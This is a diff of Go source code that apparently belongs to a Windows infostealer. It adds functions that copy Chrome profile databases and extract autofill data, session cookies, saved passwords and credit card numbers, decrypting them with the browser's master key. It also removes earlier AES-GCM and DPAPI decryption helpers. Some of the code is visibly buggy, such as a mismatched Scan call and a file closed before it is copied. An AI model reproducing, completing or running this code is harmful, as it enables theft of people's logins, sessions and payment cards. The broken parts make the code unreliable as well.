@@ -1,170 +1,185 @@
 package main
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
 	"database/sql"
-	"encoding/base64"
-	"encoding/json"
-	"fmt"
-	"io"
-	"io/ioutil"
 	"os"
-	"path/filepath"
-	"strings"
-	"syscall"
-	"unsafe"
 )
 
-type LoginData struct {
+type Login struct {
 	OriginURL string `json:"origin_url"`
 	Username  string `json:"username"`
 	Password  string `json:"password"`
 }
 
-func DecryptPassword(buff, masterKey []byte) string {
-	iv := buff[3:15]
-	payload := buff[15:]
-
-	block, err := aes.NewCipher(masterKey)
-	if err != nil {
-		return "Error while creating cipher block: " + err.Error()
-	}
-
-	aesgcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return "Error while creating GCM block: " + err.Error()
-	}
-
-	decrypted, err := aesgcm.Open(nil, iv, payload, nil)
-	if err != nil {
-		return "Error while decrypting password: " + err.Error()
-	}
-
-	return string(decrypted)
+type Cookie struct {
+	Domain     string `json:"domain"`
+	Name       string `json:"name"`
+	Path       string `json:"path"`
+	Value      string `json:"value"`
+	ExpressUTC string `json:"expires_utc"`
 }
 
-var (
-	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
-	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")
-
-	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
-	procLocalFree   = dllkernel32.NewProc("LocalFree")
-)
-
-type DATA_BLOB struct {
-	cbData uint32
-	pbData *byte
+type CreditCard struct {
+	NameOnCard   string `json:"name_on_card"`
+	CardNumber   string `json:"card_number"`
+	ExpMonth     string `json:"exp_month"`
+	ExpYear      string `json:"exp_year"`
+	DateModified string `json:"date_modified"`
 }
 
-func NewBlob(d []byte) *DATA_BLOB {
-	if len(d) == 0 {
-		return &DATA_BLOB{}
-	}
-	return &DATA_BLOB{
-		pbData: &d[0],
-		cbData: uint32(len(d)),
-	}
+type AutoFill struct {
+	Name         string `json:"name"`
+	Value        string `json:"value"`
+	DateCreated  string `json:"date_created"`
+	DateLastUsed string `json:"date_last_used"`
+	Count        string `json:"count"`
 }
 
-func (b *DATA_BLOB) ToByteArray() []byte {
-	d := make([]byte, b.cbData)
-	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
-	return d
-}
-
-func Decrypt(data []byte) ([]byte, error) {
-	var outblob DATA_BLOB
-	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
-	if r == 0 {
-		return nil, err
-	}
-	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
-	return outblob.ToByteArray(), nil
-}
-
-func GetMasterKey(localStatePath string) ([]byte, error) {
-	var masterKey []byte
-
-	jsonFile, err := os.Open(localStatePath)
-	if err != nil {
-		return masterKey, err
-	}
-
-	defer jsonFile.Close()
-
-	byteValue, err := ioutil.ReadAll(jsonFile)
-	if err != nil {
-		return masterKey, err
-	}
-	var result map[string]interface{}
-
-	_ = json.Unmarshal(byteValue, &result)
-	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
-	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)
-	stringKey := string(decodedKey)
-	stringKey = strings.Trim(stringKey, "DPAPI")
-
-	masterKey, err = Decrypt([]byte(stringKey))
-	if err != nil {
-		return masterKey, err
-	}
-
-	return masterKey, nil
-}
-
-func CreateTempAndCopyFile(originalFilePath string) (string, string) {
-	// Create a temporary directory
-	tempDir, _ := os.MkdirTemp("", "temp")
-
-	// Generate a temporary file path
-	var split []string
-	if strings.Contains(originalFilePath, "/") {
-		split = strings.Split(originalFilePath, "/")
-	} else {
-		split = strings.Split(originalFilePath, "\\")
-	}
-	tempFilePath := filepath.Join(tempDir, split[len(split)-1])
-
-	// Open the original file
-	originalFile, _ := os.Open(originalFilePath)
-
-	defer func(originalFile *os.File) {
-		_ = originalFile.Close()
-	}(originalFile)
-
-	// Create the temporary file
-	tempFile, _ := os.Create(tempFilePath)
-	defer func(tempFile *os.File) {
-		_ = tempFile.Close()
-	}(tempFile)
-
-	// Copy the contents of the original file to the temporary file
-	_, _ = io.Copy(tempFile, originalFile)
-
-	// Close the original file
-	_ = originalFile.Close()
-	_ = tempFile.Close()
-
-	return tempFilePath, tempDir
-}
-
-func CheckFileExist(filePath string) bool {
-	if _, err := os.Stat(filePath); os.IsNotExist(err) {
-		return false
-	} else {
-		return true
-	}
-}
-
-func DecryptLoginData(profiles []string, localState string) []LoginData {
-	var loginDataArray []LoginData
+func DecryptAutoFillData(profiles []string) []AutoFill {
+	var autoFillArray []AutoFill
 
 	for _, profile := range profiles {
-		loginDataPath := os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\" + profile + "\\Login data"
-		loginData, loginDirPath := CreateTempAndCopyFile(loginDataPath)
+		autoFillPath := profile + "\\Web Data"
+		autoFill := CreateTempFile("Web Data Temp")
+		CopyFile(autoFillPath, autoFill)
 
-		db, _ := sql.Open("sqlite3", loginData)
+		db, _ := sql.Open("sqlite3", autoFill.Name())
+		defer func(db *sql.DB) {
+			_ = db.Close()
+		}(db)
+
+		rows, _ := db.Query("SELECT name, value, date_created, date_last_used, count FROM autofill")
+		defer func(rows *sql.Rows) {
+			_ = rows.Close()
+		}(rows)
+
+		for rows.Next() {
+			var name string
+			var value string
+			var dateCreated string
+			var dateLastUsed string
+			var count string
+
+			_ = rows.Scan(&name, &value, &dateCreated, &dateLastUsed, &count)
+
+			autoFillArray = append(autoFillArray, AutoFill{
+				Name:         name,
+				Value:        value,
+				DateCreated:  dateCreated,
+				DateLastUsed: dateLastUsed,
+				Count:        count,
+			})
+		}
+
+		CloseFile(autoFill)
+		_ = os.Remove(autoFill.Name())
+	}
+
+	return autoFillArray
+}
+
+func DecryptCreditCardsData(profiles []string, localState string) []CreditCard {
+	var creditCardsDataArray []CreditCard
+
+	for _, profile := range profiles {
+		creditCardsDataPath := profile + "\\Web Data"
+		creditCardsData := CreateTempFile("Web Data Temp")
+		CopyFile(creditCardsDataPath, creditCardsData)
+
+		db, _ := sql.Open("sqlite3", creditCardsData.Name())
+		defer func(db *sql.DB) {
+			_ = db.Close()
+		}(db)
+
+		rows, _ := db.Query("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards")
+		defer func(rows *sql.Rows) {
+			_ = rows.Close()
+		}(rows)
+
+		for rows.Next() {
+			var nameOnCard string
+			var expirationMonth string
+			var expirationYear string
+			var encryptedCardNumber []byte
+			var dateModified string
+			var decryptedCardNumber string
+
+			_ = rows.Scan(&nameOnCard, &expirationMonth, &expirationYear, &encryptedCardNumber, &dateModified, &decryptedCardNumber)
+
+			key, _ := GetMasterKey(localState)
+			cardNumber := DecryptPassword(encryptedCardNumber, key)
+
+			creditCardsDataArray = append(creditCardsDataArray, CreditCard{
+				NameOnCard:   nameOnCard,
+				CardNumber:   cardNumber,
+				ExpMonth:     expirationMonth,
+				ExpYear:      expirationYear,
+				DateModified: dateModified,
+			})
+		}
+
+		CloseFile(creditCardsData)
+		_ = os.Remove(creditCardsData.Name())
+	}
+
+	return creditCardsDataArray
+}
+
+func DecryptCookieData(profiles []string, localState string) []Cookie {
+	var cookieDataArray []Cookie
+
+	for _, profile := range profiles {
+		cookieDataPath := profile + "\\Network\\Cookies"
+		cookieData := CreateTempFile("Cookies Temp")
+		CopyFile(cookieDataPath, cookieData)
+
+		db, _ := sql.Open("sqlite3", cookieData.Name())
+		defer func(db *sql.DB) {
+			_ = db.Close()
+		}(db)
+
+		rows, _ := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
+		defer func(rows *sql.Rows) {
+			_ = rows.Close()
+		}(rows)
+
+		for rows.Next() {
+			var hostKey string
+			var name string
+			var pathCookie string
+			var encryptedCookieValue []byte
+			var expiresUtc string
+
+			_ = rows.Scan(&hostKey, &name, &pathCookie, &encryptedCookieValue, &expiresUtc)
+
+			key, _ := GetMasterKey(localState)
+			cookie := DecryptPassword(encryptedCookieValue, key)
+
+			cookieDataArray = append(cookieDataArray, Cookie{
+				Domain:     hostKey,
+				Name:       name,
+				Path:       pathCookie,
+				Value:      cookie,
+				ExpressUTC: expiresUtc,
+			})
+		}
+
+		CloseFile(cookieData)
+		_ = os.Remove(cookieData.Name())
+	}
+
+	return cookieDataArray
+}
+
+func DecryptLoginData(profiles []string, localState string) []Login {
+	var loginDataArray []Login
+
+	for _, profile := range profiles {
+		loginDataPath := profile + "\\Login data"
+		loginData := CreateTempFile("Login Data Temp")
+		CopyFile(loginDataPath, loginData)
+
+		db, _ := sql.Open("sqlite3", loginData.Name())
 		defer func(db *sql.DB) {
 			_ = db.Close()
 		}(db)
@@ -184,52 +199,16 @@ func DecryptLoginData(profiles []string, localState string) []LoginData {
 			key, _ := GetMasterKey(localState)
 			password := DecryptPassword(encryptedPasswordValue, key)
 
-			loginDataArray = append(loginDataArray, LoginData{
+			loginDataArray = append(loginDataArray, Login{
 				OriginURL: originUrl,
 				Username:  usernameValue,
 				Password:  password,
 			})
 		}
 
-		_ = os.Remove(loginData)
-		_ = os.Remove(loginDirPath)
+		CloseFile(loginData)
+		_ = os.Remove(loginData.Name())
 	}
 
 	return loginDataArray
-}
-
-func CreateTempFile(fileName string) *os.File {
-	// Create a temporary file
-	tempFile, err := os.CreateTemp("", fileName)
-	if err != nil {
-		fmt.Println("Error creating temporary file:", err)
-		return nil
-	}
-
-	fmt.Println("Temporary file created:", tempFile.Name())
-	return tempFile
-}
-
-func CopyFile(originalFile string, tempFile *os.File) {
-	// Open the original file
-	original, err := os.Open(originalFile)
-	if err != nil {
-		fmt.Println("Error opening original file:", err)
-		return
-	}
-
-	CloseFile(original)
-
-	// Copy the contents of the original file to the temporary file
-	_, err = io.Copy(tempFile, original)
-	if err != nil {
-		fmt.Println("Error copying original file:", err)
-		return
-	}
-}
-
-func CloseFile(file *os.File) {
-	defer func(file *os.File) {
-		_ = file.Close()
-	}(file)
 }
